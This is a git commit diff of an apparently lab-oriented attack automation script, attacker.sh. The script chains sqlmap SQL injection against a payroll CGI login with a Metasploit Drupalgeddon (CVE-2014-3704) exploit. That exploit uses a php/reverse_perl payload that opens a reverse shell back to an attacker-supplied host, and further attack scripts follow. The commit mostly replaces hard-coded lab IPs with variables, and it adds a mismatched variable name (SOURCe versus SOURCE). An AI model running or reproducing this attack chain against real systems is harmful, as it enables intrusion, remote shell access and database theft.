d177b2f81f872f007c2aeb21b29c41cce0c14e5c
root <root@localhost.localdomain>
2020-04-25 23:45:47 +0000

    added source

--- attacker.sh
+++ attacker.sh
@@ -2,7 +2,7 @@
 
 ATTACK=$1
 TARGET=$2
-
+SOURCe=$3
 
 if [ $ATTACK == "CVE-2015-3306" ]
 then
@@ -17,7 +17,7 @@ then
 	then 	
 		time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
 	fi
-	tail -n 1 /root/.sqlmap/output/192.168.0.122/log >> dbres.txt
+	tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
 	DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
 	rm dbres.txt
 	time ./attack-script.sh $TARGET $DATABASE $SERVER
@@ -26,7 +26,7 @@ then
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2014-3704" ]
 then 
-	time msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit -z; sessions -i 1 -s command_shell.sh; exit -y"
+	time msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost $SOURCE; exploit -z; sessions -i 1 -s command_shell.sh; exit -y"
 	# in command shell run command background and then enter y
         SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
         rm results.txt
@@ -37,7 +37,7 @@ then
         then 
                 time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
         fi
-        tail -n 1 /root/.sqlmap/output/192.168.0.122/log >> dbres.txt
+        tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
         DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
         rm dbres.txt
         time ./attack-script.sh $TARGET $DATABASE $SERVER
@@ -57,7 +57,7 @@ then
         then 
                 time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
         fi
-        tail -n 1 /root/.sqlmap/output/192.168.0.122/log >> dbres.txt
+        tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
         DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
         rm dbres.txt
         time ./attack-script.sh $TARGET $DATABASE $SERVER
